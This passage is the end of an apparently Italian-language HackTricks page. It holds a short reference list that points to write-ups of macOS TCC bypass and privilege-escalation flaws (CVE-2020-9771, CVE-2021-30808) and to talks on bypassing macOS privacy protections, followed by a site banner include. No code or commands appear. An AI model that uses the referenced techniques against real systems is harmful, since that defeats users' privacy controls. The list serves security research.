- [19] [Stack Overflow - Impostazione delle variabili d'ambiente su OS X](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686)
- [20] [theevilbit - CVE-2020-9771: TCC bypass e privilege escalation con mount_apfs](https://theevilbit.github.io/posts/cve_2020_9771/)
- [21] [theevilbit - CVE-2021-30808: TCC bypass tramite mounting sopra il database TCC](https://theevilbit.github.io/posts/cve-2021-30808/)
- [22] [Oltre 20 modi per bypassare i meccanismi di privacy di macOS](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [23] [Vittoria schiacciante contro TCC - Oltre 20 NUOVI modi per bypassare i meccanismi di privacy di MacOS](https://www.youtube.com/watch?v=a9hsxPdRxsY)
{{#include ../../../../../banners/hacktricks-training.md}}
